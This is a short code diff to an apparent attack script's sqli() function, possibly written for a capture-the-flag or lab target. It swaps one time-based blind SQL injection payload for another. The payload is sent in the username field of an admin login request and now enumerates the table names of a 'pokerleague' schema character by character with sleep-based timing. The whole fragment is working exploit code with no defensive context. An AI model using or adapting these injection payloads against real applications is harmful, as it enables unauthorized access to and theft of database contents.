@@ -31,7 +31,8 @@ def sqli():
             post_data={
                 "op": "adminlogin",
                 #"username": f"admin' and if(substr(database(),{position},1)='{i}',sleep(0.9),1)-- -",
-                "username": f"admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)='{i}',sleep(0.9),1)-- -",
+                #"username": f"admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)='{i}',sleep(0.9),1)-- -",
+                "username": f"admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),{position},1)='{i}',sleep(0.9),1)-- -",
             
                 "password": "SAD" 
             }
